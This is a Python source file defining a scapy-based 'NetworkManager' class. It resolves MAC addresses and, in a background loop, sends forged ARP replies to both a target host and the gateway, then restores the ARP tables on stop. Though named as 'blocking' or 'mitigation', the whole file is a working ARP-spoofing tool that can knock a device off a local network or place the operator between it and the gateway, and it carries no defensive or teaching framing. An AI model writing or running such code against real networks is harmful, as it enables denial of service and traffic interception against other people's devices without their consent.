import scapy.all as scapy
import time
import threading

class NetworkManager:
    def __init__(self):
        self.stop_mitigation = False
        self.thread = None

    def get_mac(self, ip, interface=None):
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        
        if interface:
            answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False, iface=interface)[0]
        else:
            answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
        
        if answered_list:
            return answered_list[0][1].hwsrc
        return None

    def spoof(self, target_ip, spoof_ip, interface=None):
        target_mac = self.get_mac(target_ip, interface)
        if not target_mac:
            return False
            
        packet = scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        
        try:
            scapy.sendp(packet, verbose=False, iface=interface)
            return True
        except Exception as e:
            print(f"Spoof Error: {e}")
            return False

    def restore(self, destination_ip, source_ip, interface=None):
        try:
            destination_mac = self.get_mac(destination_ip, interface)
            source_mac = self.get_mac(source_ip, interface)
            if destination_mac and source_mac:
                packet = scapy.Ether(dst=destination_mac) / scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
                scapy.sendp(packet, count=4, verbose=False, iface=interface)
        except Exception as e:
             print(f"Restore failed for {destination_ip}: {e}")

    def start_blocking(self, target_ip, gateway_ip, interface=None):
        self.stop_mitigation = False
        self.thread = threading.Thread(target=self._block_loop, args=(target_ip, gateway_ip, interface))
        self.thread.daemon = True
        self.thread.start()

    def stop_blocking(self):
        self.stop_mitigation = True

    def _block_loop(self, target_ip, gateway_ip, interface):
        scapy.conf.checkIPaddr = False
        
        print(f"Starting block on {target_ip} via {gateway_ip} ({interface})...")
        while not self.stop_mitigation:
            s1 = self.spoof(target_ip, gateway_ip, interface)
            s2 = self.spoof(gateway_ip, target_ip, interface)
            
            if s1 and s2:
                print(".", end="", flush=True) 
            else:
                print("!", end="", flush=True) 
                
            time.sleep(0.5) 
        
        print("\nRestoring ARP tables...")
        self.restore(target_ip, gateway_ip, interface)
        self.restore(gateway_ip, target_ip, interface)
